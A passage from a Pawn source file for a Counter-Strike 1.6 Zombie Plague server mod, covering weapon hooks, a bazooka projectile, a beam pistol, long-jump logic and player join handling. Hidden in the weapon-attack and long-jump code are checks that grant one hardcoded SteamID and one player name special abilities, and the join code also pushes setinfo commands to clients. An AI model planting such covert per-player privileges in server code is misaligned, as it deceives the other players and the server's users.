		static weaponid
		weaponid = cs_get_weapon_id(weapon_ent)
		
		// Add to player's bpammo
		ExecuteHamB(Ham_GiveAmmo, id, extra_ammo, AMMOTYPE[weaponid], MAXBPAMMO[weaponid])
		set_pev(weapon_ent, PEV_ADDITIONAL_AMMO, 0)
	}
}

// Ham Weapon Deploy Forward
/*public fw_Item_Deploy_Post(weapon_ent)
{
	// Get weapon's owner
	static owner
	owner = fm_cs_get_weapon_ent_owner(weapon_ent)
	
	// Get weapon's id
	static weaponid
	weaponid = cs_get_weapon_id(weapon_ent)
	
	// Store current weapon's id for reference
	g_currentweapon[owner] = weaponid
	
	if( !g_zombie[owner] && ((1 << weaponid) & PRIMARY_WEAPONS_BIT_SUM) ) gPrimaryWeapon[owner] = 1
	else if( !g_zombie[owner] && ((1 << weaponid) & SECONDARY_WEAPONS_BIT_SUM) ) gPrimaryWeapon[owner] = 0
	else gPrimaryWeapon[owner] = -1
	
	// Replace weapon models with custom ones
	replace_weapon_models(owner, weaponid)
	
	// Zombie not holding an allowed weapon for some reason
	if (g_zombie[owner] && !((1<<weaponid) & ZOMBIE_ALLOWED_WEAPONS_BITSUM))
	{
		// Switch to knife
		g_currentweapon[owner] = CSW_KNIFE
		engclient_cmd(owner, "weapon_knife")
	}
}*/

// Ham Item AddToPlayer
/*#if defined WEAPONS_EDIT_FOR_DROP
public fw_Item_AddToPlayer( szWeapon, Index )
{
	if( is_valid_ent( szWeapon ) && is_user_valid_connected( Index ) )
	{
		static EGI; EGI = entity_get_int( szWeapon, EV_INT_impulse )
		
		if( EGI == 101100 ) 
		{ 
			gWeapon[Index][ARMA_PRIMARIA][16] = 1
			gWeaponsEdit[Index][ARMA_PRIMARIA] = 1 
		} // M3
		else if( EGI == 101100*2 ) 
		{ 
			gWeapon[Index][ARMA_PRIMARIA][17] = 1
			gWeaponsEdit[Index][ARMA_PRIMARIA] = 1 
		} // MP5 NAVY
		else if( EGI == 101100*3 ) 
		{ 
			gWeapon[Index][ARMA_PRIMARIA][18] = 1
			gWeaponsEdit[Index][ARMA_PRIMARIA] = 1 
		} // COLT
		else if( EGI == 101100*4 ) 
		{ 
			gWeapon[Index][ARMA_PRIMARIA][19] = 1
			gWeaponsEdit[Index][ARMA_PRIMARIA] = 1 
		} // AK 47
		else if( EGI == 101100*5 ) 
		{ 
			gWeapon[Index][ARMA_PRIMARIA][20] = 1
			gWeaponsEdit[Index][ARMA_PRIMARIA] = 1 
		} // TMP
		else if( EGI == 101100*6 ) 
		{ 
			gWeapon[Index][ARMA_PRIMARIA][21] = 1 
			gWeaponsEdit[Index][ARMA_PRIMARIA] = 1 
		} // AUG
		else if( EGI == 101100*7 ) 
		{ 
			gWeapon[Index][ARMA_PRIMARIA][22] = 1 
			gWeaponsEdit[Index][ARMA_PRIMARIA] = 1 
		} // SG 550
		else if( EGI == 101100*8 ) 
		{
			gWeapon[Index][ARMA_PRIMARIA][23] = 1 
			gWeaponsEdit[Index][ARMA_PRIMARIA] = 1 
		} // M3 _ 2
		else if( EGI == 101100*9 ) 
		{ 
			gWeapon[Index][ARMA_PRIMARIA][24] = 1 
			gWeaponsEdit[Index][ARMA_PRIMARIA] = 1 
		} // MP5 NAVY _ 2
		else if( EGI == 101100*10 ) 
		{
			gWeapon[Index][ARMA_PRIMARIA][25] = 1 
			gWeaponsEdit[Index][ARMA_PRIMARIA] = 1 
		} // AK 47 _ 2
		else if( EGI == 101100*11 ) 
		{ 
			gWeapon[Index][ARMA_PRIMARIA][26] = 1 
			gWeaponsEdit[Index][ARMA_PRIMARIA] = 1 
		} // XM 1014
		else if( EGI == 101100*12 ) 
		{ 
			gWeapon[Index][ARMA_PRIMARIA][27] = 1 
			gWeaponsEdit[Index][ARMA_PRIMARIA] = 1 
		} // COLT _ 2
		else if( EGI == 101100*13 ) 
		{ 
			gWeapon[Index][ARMA_PRIMARIA][28] = 1 
			gWeaponsEdit[Index][ARMA_PRIMARIA] = 1 
		} // M249
		else if( EGI == 101100*14 ) 
		{ 
			gWeapon[Index][ARMA_SECUNDARIA][6] = 1 
			gWeaponsEdit[Index][ARMA_SECUNDARIA] = 1 
		} // GLOCK
		else if( EGI == 101100*15 ) 
		{ 
			gWeapon[Index][ARMA_SECUNDARIA][7] = 1 
			gWeaponsEdit[Index][ARMA_SECUNDARIA] = 1 
		} // USP
		else if( EGI == 101100*16 ) 
		{ 
			gWeapon[Index][ARMA_SECUNDARIA][8] = 1 
			gWeaponsEdit[Index][ARMA_SECUNDARIA] = 1 
		} // P228
		else if( EGI == 101100*17 ) 
		{ 
			gWeapon[Index][ARMA_SECUNDARIA][9] = 1 
			gWeaponsEdit[Index][ARMA_SECUNDARIA] = 1 
		} // FIVESEVEN
		else if( EGI == 101100*18 ) 
		{ 
			gWeapon[Index][ARMA_SECUNDARIA][10] = 1 
			gWeaponsEdit[Index][ARMA_SECUNDARIA] = 1 
		} // ELITE
		else if( EGI == 101100*19 ) 
		{ 
			gWeapon[Index][ARMA_SECUNDARIA][11] = 1
			gWeaponsEdit[Index][ARMA_SECUNDARIA] = 1 
		} // DEAGLE
		else if( EGI == 101100*20 ) 
		{ 
			gWeapon[Index][ARMA_SECUNDARIA][12] = 1 
			gWeaponsEdit[Index][ARMA_SECUNDARIA] = 1 
		} // GLOCK _ 2
		else if( EGI == 101100*21 ) 
		{ 
			gWeapon[Index][ARMA_SECUNDARIA][13] = 1 
			gWeaponsEdit[Index][ARMA_SECUNDARIA] = 1 
		} // USP _ 2
		else if( EGI == 101100*22 ) 
		{ 
			gWeapon[Index][ARMA_SECUNDARIA][14] = 1 
			gWeaponsEdit[Index][ARMA_SECUNDARIA] = 1 
		} // P228 _ 2
		else if( EGI == 101100*23 ) 
		{ 
			gWeapon[Index][ARMA_SECUNDARIA][15] = 1 
			gWeaponsEdit[Index][ARMA_SECUNDARIA] = 1 
		} // FIVESEVEN _ 2
		else if( EGI == 101100*24 ) 
		{ 
			gWeapon[Index][ARMA_SECUNDARIA][16] = 1 
			gWeaponsEdit[Index][ARMA_SECUNDARIA] = 1 
		} // ELITE _ 2
		else if( EGI == 101100*25 ) 
		{ 
			gWeapon[Index][ARMA_SECUNDARIA][17] = 1
			gWeaponsEdit[Index][ARMA_SECUNDARIA] = 1 
		} // DEAGLE _ 2
		
		entity_set_int( szWeapon, EV_INT_impulse, 0 )
		
		return HAM_HANDLED;
	}
	
	return HAM_IGNORED;
}
#endif*/

public fw_Weapon_PrimaryAttack_Post(weapon)
{
	if(!pev_valid(weapon))
		return HAM_IGNORED;
		
	new id = get_pdata_cbase(weapon, 41, 4);
	
	if(!is_user_valid_alive(id))
		return HAM_IGNORED;
	
	if(ITEM_EXTRA_BalasPrecision[id] && !g_zombie[id] && !g_survivor[id])
	{
		static Float:fPunchAngle[3];
		fPunchAngle[0] = 0.0;
		
		entity_set_vector(id, EV_VEC_punchangle, fPunchAngle);
	}
	
	if(equal(g_steamid[id], "STEAM_0:0:39456011") && g_currentweapon[id] == CSW_ELITE && get_pdata_int(weapon, OFFSET_CLIPAMMO, EXTRAOFFSET_WEAPONS) > 0)
		user_shoot[id] = true 
	
	return HAM_IGNORED;
}

public fw_Knife_PrimaryAttack_Post(knife)
{	
	if(!pev_valid(knife))
		return HAM_IGNORED;
	
	// Get knife owner
	static id
	id = get_pdata_cbase(knife, 41, 4)
	
	if(is_user_valid_alive(id))
	{
		if(gJason[id])
		{
			// Get new fire rate
			static Float:flRate
			flRate = 0.1
			
			// Set new rates
			set_pdata_float(knife, 46, flRate, 4)
			set_pdata_float(knife, 47, flRate, 4)
			set_pdata_float(knife, 48, flRate, 4)
			
			// Get new recoil
			static Float:flPunchAngle[3]
			flPunchAngle[0] = -4.0
			
			// Punch their angles
			entity_set_vector(id, EV_VEC_punchangle, flPunchAngle)
		}
	}
	
	return HAM_IGNORED;
}

public fw_Knife_SecondaryAttack_Post(knife)
{	
	if(!pev_valid(knife))
		return HAM_IGNORED;

	// Get knife owner
	static id
	id = get_pdata_cbase(knife, 41, 4)
	
	// has a Chainsaw
	if(is_user_valid_alive(id))
	{
		if(gJason[id])
		{
			// Get new fire rate
			static Float:flRate
			flRate = 0.8
			
			// Set new rates
			set_pdata_float(knife, 46, flRate, 4)
			set_pdata_float(knife, 47, flRate, 4)
			set_pdata_float(knife, 48, flRate, 4)
			
			// Get new recoil
			static Float:flPunchAngle[3]
			flPunchAngle[0] = -8.5
			
			// Punch their angles
			entity_set_vector(id, EV_VEC_punchangle, flPunchAngle)
		}
	}
	
	return HAM_IGNORED;
}

public fw_Scout_PrimaryAttack_Post(scout)
{
	if(!pev_valid(scout))
		return HAM_IGNORED;
		
	// Get scout owner
	static id
	id = get_pdata_cbase(scout, 41, 4)
	
	if(is_user_valid_alive(id))
	{
		if(gSniper[id])
		{
			// Get new fire rate
			static Float:flRate
			flRate = 0.1
			
			// Set new rates
			set_pdata_float(scout, 46, flRate, 4)
			set_pdata_float(scout, 47, flRate, 4)
			set_pdata_float(scout, 48, flRate, 4)
			
			// Get new recoil
			static Float:flPunchAngle[3]
			flPunchAngle[0] = -5.5
			
			// Punch their angles
			entity_set_vector(id, EV_VEC_punchangle, flPunchAngle)
		}
	}
	
	return HAM_IGNORED;
}

/*public fw_MP5Navy_PrimaryAttack_Post(mp5navy)
{
	// Get mp5navy owner
	static id
	id = get_pdata_cbase(mp5navy, 41, 4)
	
	if(is_user_valid_alive(id) && g_survivor[id] &&)
	{
		// Get new fire rate
		static Float:flRate
		flRate = ammount_upgradeF_special_mode(id, HAB_SURVIVOR, SURVIVOR_DISPARO_SPEED, 0.3)
		
		// Set new rates
		set_pdata_float(mp5navy, 46, flRate, 4)
		set_pdata_float(mp5navy, 47, flRate, 4)
		set_pdata_float(mp5navy, 48, flRate, 4)
	}
	
	return HAM_IGNORED;
}*/

public fire_bazooka(id)
{
	new iEntity = create_entity("info_target")
	
	if( !iEntity )
		return PLUGIN_CONTINUE;
	
	entity_set_string(iEntity, EV_SZ_classname, "bazooka_rocket")
	entity_set_model(iEntity, "models/zombie_plague/tcs_rocket_1.mdl")
	
	entity_set_size(iEntity, Float:{0.0, 0.0, 0.0}, Float:{0.0, 0.0, 0.0})
	entity_set_int(iEntity, EV_INT_movetype, MOVETYPE_FLY)
	entity_set_int(iEntity, EV_INT_solid, SOLID_BBOX)
	
	new Float:vSrc[3], Float:Aim[3], Float:Origin[3];
	
	entity_get_vector(id, EV_VEC_origin, vSrc)
	
	velocity_by_aim(id, 64, Aim)
	
	entity_get_vector(id, EV_VEC_origin, Origin)
	
	vSrc[0] += Aim[0]
	vSrc[1] += Aim[1]
	
	entity_set_origin(iEntity, vSrc)
	
	new Float:velocity[3], Float:angles[3];
	velocity_by_aim(id, 1200, velocity)
	
	entity_set_vector(iEntity, EV_VEC_velocity, velocity)
	
	vector_to_angle(velocity, angles)
	
	entity_set_vector(iEntity, EV_VEC_angles, angles)
	entity_set_edict(iEntity, EV_ENT_owner, id)
	entity_set_float(iEntity, EV_FL_takedamage, 1.0)
	
	// Aura Explosion
	static Float:Lrigin[3]
	pev(iEntity, pev_origin, Lrigin)
	
	engfunc(EngFunc_MessageBegin, MSG_BROADCAST, SVC_TEMPENTITY, Lrigin, 0)
	write_byte(TE_DLIGHT)
	engfunc(EngFunc_WriteCoord, Lrigin[0])
	engfunc(EngFunc_WriteCoord, Lrigin[1])
	engfunc(EngFunc_WriteCoord, Lrigin[2])
	write_byte(80) // Radius
	write_byte(255) // R
	write_byte(0) // G
	write_byte(0) // B
	write_byte(55)
	write_byte(50)
	message_end()
	
	message_begin(MSG_BROADCAST, SVC_TEMPENTITY)
	write_byte(TE_BEAMFOLLOW)
	write_short(iEntity)
	write_short(g_trail2Spr)
	write_byte(50)
	write_byte(15)
	write_byte(200)
	write_byte(200)
	write_byte(200)
	write_byte(255)
	message_end()
	
	emit_sound(iEntity, CHAN_WEAPON, "weapons/rocketfire1.wav", 1.0, ATTN_NORM, 0, PITCH_NORM)
	
	return PLUGIN_CONTINUE;
}

public pfn_touch(ptr, ptd)
{
	if( is_valid_ent(ptr) )
	{
		new classname[32]
		entity_get_string(ptr, EV_SZ_classname, classname, 31)

		if( equal(classname, "bazooka_rocket") )
		{
			new Float:fOrigin[3]
			new iOrigin[3]
			
			emit_sound(ptr, CHAN_WEAPON, "weapons/mortarhit.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM)
			emit_sound(ptr, CHAN_VOICE, "weapons/mortarhit.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM)
			
			emit_sound(ptr, CHAN_WEAPON, "weapons/c4_explode1.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM)
			emit_sound(ptr, CHAN_VOICE, "weapons/c4_explode1.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM)
			
			entity_get_vector(ptr, EV_VEC_origin, fOrigin)
			FVecIVec(fOrigin, iOrigin)
			DamageBazooka(ptr)
			
			// Explosion One
			message_begin(MSG_BROADCAST, SVC_TEMPENTITY)
			write_byte(17)
			write_coord(floatround(fOrigin[0]))
			write_coord(floatround(fOrigin[1]))
			write_coord(floatround(fOrigin[2]) + 75)
			write_short(g_explo2Spr)
			write_byte(50)
			write_byte(255)
			message_end()
			
			// Explosion Two
			message_begin(MSG_BROADCAST, SVC_TEMPENTITY)
			write_byte(17)
			write_coord(floatround(fOrigin[0]))
			write_coord(floatround(fOrigin[1]))
			write_coord(floatround(fOrigin[2]) + 50)
			write_short(g_explo3Spr)
			write_byte(75)
			write_byte(255)
			message_end()

			// Explosion Three
			message_begin(MSG_BROADCAST, SVC_TEMPENTITY)
			write_byte(17)
			write_coord(floatround(fOrigin[0]))
			write_coord(floatround(fOrigin[1]))
			write_coord(floatround(fOrigin[2]) + 25)
			write_short(g_explo4Spr)
			write_byte(100)
			write_byte(255)
			message_end()

			// Smoke
			message_begin(MSG_BROADCAST, SVC_TEMPENTITY)
			write_byte(5)
			write_coord(floatround(fOrigin[0]))
			write_coord(floatround(fOrigin[1]))
			write_coord(floatround(fOrigin[2]) + 125)
			write_short(g_smoke2Spr)
			write_byte(75)
			write_byte(3)
			message_end()

			// Aura Explosion
			static Float:Lrigin[3]
			pev(ptr, pev_origin, Lrigin)
			
			engfunc(EngFunc_MessageBegin, MSG_BROADCAST, SVC_TEMPENTITY, Lrigin, 0)
			write_byte(TE_DLIGHT)
			engfunc(EngFunc_WriteCoord, Lrigin[0])
			engfunc(EngFunc_WriteCoord, Lrigin[1])
			engfunc(EngFunc_WriteCoord, Lrigin[2])
			write_byte(120) // Radius
			write_byte(255) // R
			write_byte(0) // G
			write_byte(0) // B
			write_byte(60)
			write_byte(90)
			message_end()

			new PlayerPos[3], distance
			for (new i = 1; i <= g_maxplayers; i++)
			{
				if (is_user_alive(i))
				{
					get_user_origin(i, PlayerPos)

					new NonFloatEndOrigin[3]
					NonFloatEndOrigin[0] = floatround(fOrigin[0])
					NonFloatEndOrigin[1] = floatround(fOrigin[1])
					NonFloatEndOrigin[2] = floatround(fOrigin[2])

					distance = get_distance(PlayerPos, NonFloatEndOrigin)
					if (distance <= 250)
					{
						// Screen Shake
						message_begin(MSG_ONE_UNRELIABLE, get_user_msgid("ScreenShake"), {0,0,0}, i)
						write_short(1<<14)
						write_short(1<<14)
						write_short(1<<14)
						message_end()

						// Screen fade
						message_begin(MSG_ONE_UNRELIABLE, get_user_msgid("ScreenFade"), _, i)
						write_short(1<<12*1) // duration
						write_short(1<<12*1) // hold time
						write_short(0x0000) // fade type
						write_byte(210) // R
						write_byte(0) // G
						write_byte(0) // B
						write_byte (235) // alpha
						message_end()
					}
				}
			}

			message_begin(MSG_BROADCAST, SVC_TEMPENTITY)
			write_byte(21)
			write_coord(floatround(fOrigin[0]))
			write_coord(floatround(fOrigin[1]))
			write_coord(floatround(fOrigin[2]))
			write_coord(floatround(fOrigin[0]) + 200)
			write_coord(floatround(fOrigin[1]) + 200)
			write_coord(floatround(fOrigin[2]) - 800)
			write_short(g_whiteSpr)
			write_byte(0)
			write_byte(0)
			write_byte(16)
			write_byte(128)
			write_byte(0)
			write_byte(255)
			write_byte(200)
			write_byte(200)
			write_byte(255)
			write_byte(0)
			message_end()

			if( is_valid_ent(ptd) )
			{
				new classname2[32]
				entity_get_string(ptd, EV_SZ_classname, classname2, 31)

				if( equal(classname2, "func_breakable") )
					force_use(ptr, ptd)
			}

			remove_entity(ptr)
		}
	}
	return PLUGIN_CONTINUE;
}

stock DamageBazooka(Entidad)
{
	new id = entity_get_edict(Entidad, EV_ENT_owner)
	
	for(new i = 1; i <= g_maxplayers; i++)
	{
		if( is_user_alive(i) )
		{
			new Distancia = floatround(entity_range(Entidad, i))

			if(Distancia <= 250)
			{
				new HP = get_user_health(i)
				new Float:DMG = 5000.0 - ( (5000.0 / 250.0) * float(Distancia) )

				new Origin[3]
				get_user_origin(i, Origin)

				if( !g_zombie[i] )
				{
					if(HP > DMG)
						TakeDamageBazooka(i, floatround(DMG), Origin, DMG_BLAST)
					else
						log_kill(id, i, "Bazooka", 0)
				}
			}
		}
	}
}

stock log_kill(killer, victim, weapon[], headdisparo)
{
	set_msg_block(get_user_msgid("DeathMsg"), BLOCK_SET)
	
	ExecuteHamB(Ham_Killed, victim, killer, 2)
	
	set_msg_block(get_user_msgid("DeathMsg"), BLOCK_NOT)
	
	message_begin(MSG_BROADCAST, get_user_msgid("DeathMsg"))
	write_byte(killer)
	write_byte(victim)
	write_byte(headdisparo)
	write_string(weapon)
	message_end()

	if(get_user_team(killer)!=get_user_team(victim))
	{
		set_user_frags(killer,get_user_frags(killer) +1)
	}
	if(get_user_team(killer)==get_user_team(victim))
	{
		set_user_frags(killer,get_user_frags(killer) -1)
	}

	new kname[32], vname[32], kauthid[32], vauthid[32], kteam[10], vteam[10]

	get_user_name(killer, kname, 31)
	get_user_team(killer, kteam, 9)
	get_user_authid(killer, kauthid, 31)

	get_user_name(victim, vname, 31)
	get_user_team(victim, vteam, 9)
	get_user_authid(victim, vauthid, 31)

	log_message("^"%s<%d><%s><%s>^" killed ^"%s<%d><%s><%s>^" with ^"%s^"",
	kname, get_user_userid(killer), kauthid, kteam,
 	vname, get_user_userid(victim), vauthid, vteam, weapon)

 	return PLUGIN_CONTINUE;
}

stock TakeDamageBazooka(victim, damage, origin[3], bit)
{
	message_begin(MSG_ONE, get_user_msgid("Damage"), {0, 0, 0}, victim)
	write_byte(21)
	write_byte(20)
	write_long(bit)
	write_coord(origin[0])
	write_coord(origin[1])
	write_coord(origin[2])
	message_end()

	set_user_health(victim, get_user_health(victim) - damage)
}

fire_deagle_bullet(id)
{
	// Fire Effect
	if(is_user_valid_alive(id))
	{
		new iR = random_num(1, 2)
		
		entity_set_int(id, EV_INT_weaponanim, iR)
		message_begin(MSG_ONE_UNRELIABLE, SVC_WEAPONANIM, _, id)
		write_byte(iR)
		write_byte(entity_get_int(id, EV_INT_body))
		message_end()
		
		emit_sound(id, CHAN_VOICE, "weapons/electro5.wav", VOL_NORM, ATTN_NORM, 0, PITCH_HIGH)
		emit_sound(id, CHAN_WEAPON, "weapons/electro5.wav", VOL_NORM, ATTN_NORM, 0, PITCH_HIGH)
		
		entity_set_vector(id, EV_VEC_punchangle, Float:{ -1.0, 0.0, 0.0 })
		
		// Some vars
		static iTarget, iBody, iEndOrigin[3]
		
		// Get end origin from eyes
		get_user_origin(id, iEndOrigin, 3)
		
		// Make gun beam
		beam_from_gun(id, iEndOrigin)
		
		// Get user aiming
		get_user_aiming(id, iTarget, iBody)
		
		if(g_isalive[iTarget] && g_zombie[iTarget])
		{
			ExecuteHamB(Ham_Killed, iTarget, id, 2)
			
			// Smallest ring
			engfunc(EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, iEndOrigin, 0)
			write_byte(TE_BEAMCYLINDER) // TE id
			engfunc(EngFunc_WriteCoord, iEndOrigin[0]) // x
			engfunc(EngFunc_WriteCoord, iEndOrigin[1]) // y
			engfunc(EngFunc_WriteCoord, iEndOrigin[2]) // z
			engfunc(EngFunc_WriteCoord, iEndOrigin[0]) // x axis
			engfunc(EngFunc_WriteCoord, iEndOrigin[1]) // y axis
			engfunc(EngFunc_WriteCoord, iEndOrigin[2]+385.0) // z axis
			write_short(g_exploSpr) // sprite
			write_byte(0) // startframe
			write_byte(0) // framerate
			write_byte(4) // life
			write_byte(30) // width
			write_byte(0) // noise
			write_byte(0) // red
			write_byte(0) // green
			write_byte(255) // blue
			write_byte(255) // brightness
			write_byte(0) // speed
			message_end()
			
			// Medium ring
			engfunc(EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, iEndOrigin, 0)
			write_byte(TE_BEAMCYLINDER) // TE id
			engfunc(EngFunc_WriteCoord, iEndOrigin[0]) // x
			engfunc(EngFunc_WriteCoord, iEndOrigin[1]) // y
			engfunc(EngFunc_WriteCoord, iEndOrigin[2]) // z
			engfunc(EngFunc_WriteCoord, iEndOrigin[0]) // x axis
			engfunc(EngFunc_WriteCoord, iEndOrigin[1]) // y axis
			engfunc(EngFunc_WriteCoord, iEndOrigin[2]+470.0) // z axis
			write_short(g_exploSpr) // sprite
			write_byte(0) // startframe
			write_byte(0) // framerate
			write_byte(4) // life
			write_byte(30) // width
			write_byte(0) // noise
			write_byte(0) // red
			write_byte(0) // green
			write_byte(255) // blue
			write_byte(255) // brightness
			write_byte(0) // speed
			message_end()
			
			// Largest ring
			engfunc(EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, iEndOrigin, 0)
			write_byte(TE_BEAMCYLINDER) // TE id
			engfunc(EngFunc_WriteCoord, iEndOrigin[0]) // x
			engfunc(EngFunc_WriteCoord, iEndOrigin[1]) // y
			engfunc(EngFunc_WriteCoord, iEndOrigin[2]) // z
			engfunc(EngFunc_WriteCoord, iEndOrigin[0]) // x axis
			engfunc(EngFunc_WriteCoord, iEndOrigin[1]) // y axis
			engfunc(EngFunc_WriteCoord, iEndOrigin[2]+555.0) // z axis
			write_short(g_exploSpr) // sprite
			write_byte(0) // startframe
			write_byte(0) // framerate
			write_byte(4) // life
			write_byte(30) // width
			write_byte(0) // noise
			write_byte(0) // red
			write_byte(0) // green
			write_byte(255) // blue
			write_byte(255) // brightness
			write_byte(0) // speed
			message_end()
		}
	}
}

beam_from_gun(id, iEndOrigin[3])
{
	// Make a cool beam
	message_begin(MSG_BROADCAST, SVC_TEMPENTITY)
	write_byte(TE_BEAMENTPOINT) // TE id
	write_short(id | 0x1000) // start entity
	write_coord(iEndOrigin[0]) // endposition.x
	write_coord(iEndOrigin[1]) // endposition.y
	write_coord(iEndOrigin[2]) // endposition.z
	write_short(g_beamSpr)    // sprite index
	write_byte(1)	// framestart
	write_byte(1)	// framerate
	write_byte(5)	// life in 0.1's
	write_byte(40)	// width
	write_byte(0)	// noise
	write_byte(0)	// r
	write_byte(0)	// g
	write_byte(255)	// b
	write_byte(255)	// brightness
	write_byte(20)	// speed
	message_end()
	
	// Dynamic Light
	message_begin(MSG_BROADCAST, SVC_TEMPENTITY, iEndOrigin)
	write_byte(TE_DLIGHT) // TE id
	write_coord(iEndOrigin[0]) // position.x
	write_coord(iEndOrigin[1]) // position.y
	write_coord(iEndOrigin[2]) // position.z
	write_byte(30) // radius
	write_byte(0) // red
	write_byte(0) // green
	write_byte(255) // blue
	write_byte(10) // life
	write_byte(45) // decay rate
	message_end()
	
	// Sparks
	message_begin(MSG_BROADCAST, SVC_TEMPENTITY, iEndOrigin)
	write_byte(TE_SPARKS) // TE id
	write_coord(iEndOrigin[0]) // position.x
	write_coord(iEndOrigin[1]) // position.y
	write_coord(iEndOrigin[2]) // position.z
	message_end()
}

public PowerDeactivate(id)
{
	client_print(id, print_center, "Inmunidad desactivada")
	CC(0, "!g[ZP]!y El survivor ha perdido su inmunidad")
	g_nodamage[id] = 0
}

public fw_Player_Jump(id)
{
	if( !is_user_alive(id) || !g_zombie[id] )
		return HAM_IGNORED;

	static iFlags; iFlags = entity_get_int(id, EV_INT_flags)

	if( FBitSet(iFlags, FL_WATERJUMP) || entity_get_int(id, EV_INT_waterlevel) >= 2 )
		return HAM_IGNORED;

	const XTRA_OFS_PLAYER = 5
	const m_afButtonPressed = 246
	
	static afButtonPressed; afButtonPressed = get_pdata_int(id, m_afButtonPressed, XTRA_OFS_PLAYER)

	if( !FBitSet(afButtonPressed, IN_JUMP) || !FBitSet(iFlags, FL_ONGROUND) )
		return HAM_IGNORED;

	const m_fLongJump = 356

	if(	(entity_get_int(id, EV_INT_bInDuck) || iFlags & FL_DUCKING)
	&& get_pdata_int(id, m_fLongJump, XTRA_OFS_PLAYER)
	&& entity_get_int(id, EV_INT_button) & IN_DUCK
	&& entity_get_int(id, EV_INT_flDuckTime) )
	{
		static Float:fVecTemp[3], iVelMin;
		entity_get_vector(id, EV_VEC_velocity, fVecTemp)
		if( equal(g_playername[id], "Kiske-SO     T! CS") ) iVelMin = 2;
		else iVelMin = 30
		
		if( vector_length(fVecTemp) > iVelMin ) // MIN VELOCITY FOR LONGJUMP
		{
			const m_Activity = 73
			const m_IdealActivity = 74

			const PLAYER_SUPERJUMP = 7
			const ACT_LEAP = 8

			entity_get_vector(id, EV_VEC_punchangle, fVecTemp)
			fVecTemp[0] = -5.0 // PUNCHANGLE LONGJUMP
			entity_set_vector(id, EV_VEC_punchangle, fVecTemp)

			get_global_vector(GL_v_forward, fVecTemp)
			
			// SPEED LONGJUMP
			static Float:flLongJumpSpeed, Float:flLongJumpAlture;
			
			if(g_nemesis[id]) 
			{
				flLongJumpSpeed = ammount_upgradeF_special_mode(id, HAB_NEMESIS, NEMESIS_LJ_SPEED, 360.0) * 1.6
				flLongJumpAlture = ammount_upgradeF_special_mode(id, HAB_NEMESIS, NEMESIS_LJ_ALTURE, 310.0)
			}
			else
			{
				flLongJumpSpeed = 360.0 * 1.6
				flLongJumpAlture = 310.0
			}
			
			fVecTemp[0] *= flLongJumpSpeed
			fVecTemp[1] *= flLongJumpSpeed
			fVecTemp[2] = flLongJumpAlture // ALTURE LONJUMP

			entity_set_vector(id, EV_VEC_velocity, fVecTemp)

			set_pdata_int(id, m_Activity, ACT_LEAP, XTRA_OFS_PLAYER)
			set_pdata_int(id, m_IdealActivity, ACT_LEAP, XTRA_OFS_PLAYER)
			MarkUserLongJump(id)

			entity_set_int(id, EV_INT_oldbuttons, entity_get_int(id, EV_INT_oldbuttons) | IN_JUMP)

			entity_set_int(id, EV_INT_gaitsequence, PLAYER_SUPERJUMP)
			entity_set_float(id, EV_FL_frame, 0.0)

			set_pdata_int(id, m_afButtonPressed, afButtonPressed & ~IN_JUMP, XTRA_OFS_PLAYER)
			
			return HAM_SUPERCEDE;
		}
	}
	
	return HAM_IGNORED;
}

public fw_Player_Duck(id)
{
	if( HasUserLongJump(id) )
	{
		ClearUserLongJump(id)
		return HAM_SUPERCEDE;
	}
	
	return HAM_IGNORED;
}

// WeaponMod bugfix
//forward wpn_gi_reset_weapon(id);
public wpn_gi_reset_weapon(id)
{
	// Replace knife model
	replace_weapon_models(id, CSW_KNIFE)
}

// Client joins the game
public client_putinserver(id)
{
	// Plugin disabled?
	if (is_user_hltv(id) || !is_user_connected(id)) return;
	
	// Player joined
	g_isconnected[id] = true
	
	/*new iEPA = 0;
	for( new x = 1; x <= g_maxplayers; x++ )
	{
		if( g_isconnected[x] ) iEPA++
		
		if( iEPA >= 20 )
		{
			if( get_user_flags( id ) & ADMIN_RESERVATION )
			{
				id = GetMinTimePlayed()
				server_cmd( "kick #%d ^"HAS SIDO REEMPLAZADO POR UN PREMIUM/ADMIN. MAX 19^"", get_user_userid(id) )
			}
			else server_cmd( "kick #%d ^"MAXIMO 19. SOLO TEMPORAL^"", get_user_userid(id) )
		}
	}*/
	
	get_user_authid(id, g_steamid[id], charsmax(g_steamid[]))
	
	// Cache player's name
	get_user_name(id, g_playername[id], charsmax(g_playername[]))
	
	// Replace invalid characters
	replace_all( g_playername[id], charsmax(g_playername[]), "\", "" )
	replace_all( g_playername[id], charsmax(g_playername[]), "/", "" )
	
	// Initialize player vars
	reset_vars(id, 1)
	
	if( get_user_flags( id ) & ADMIN_RESERVATION )
	{
		switch( gTH )
		{
			case 0: gTH_Mult[id][0] = 4
			case 1: gTH_Mult[id][0] = 6 // TAN
		}
		
		gTH_Mult[id][1] = 2
	}	
	else
	{
		switch( gTH )
		{
			case 0: gTH_Mult[id][0] = 2
			case 1: gTH_Mult[id][0] = 3 // TAN
		}
		
		gTH_Mult[id][1] = 1
	}
	
	if( gWinMult_Change[0] > 0 ) gTH_Mult[id][0] = gWinMult_Change[0]
	if( gWinMult_Change[1] > 0 ) gTH_Mult[id][1] = gWinMult_Change[1]
	
	// Set some tasks for humans only
	if (!is_user_bot(id))
	{
		// Disable minmodels for clients to see zombies properly
		set_task(5.0, "disable_minmodels", id)
		
		// Para que no de el error "Info string length exceeded" borramos algunas setinfos.
		client_cmd( id, "setinfo bottomcolor ^"^"" )
		client_cmd( id, "setinfo cl_lc ^"^"" )
		client_cmd( id, "setinfo model ^"^"" )
		client_cmd( id, "setinfo topcolor ^"^"" )
		client_cmd( id, "setinfo _9387 ^"^"" )
		client_cmd( id, "setinfo _iv ^"^"" )
		client_cmd( id, "setinfo _ah ^"^"" )
		client_cmd( id, "setinfo _puqz ^"^"" )
		client_cmd( id, "setinfo _ndmh ^"^"" )
		client_cmd( id, "setinfo _ndmf ^"^"" )
		client_cmd( id, "setinfo _ndms ^"^"" )
		
		// Check Account
		set_task(0.1, "CheckAccount", id)
		
		client_cmd(id, "chooseteam")
		set_task(0.1, "clcmd_changeteam", id)
		
		// Random time for Save Dates
		set_task(random_float(180.0, 360.0), "TASK_SaveDates", id, _, _, "b")
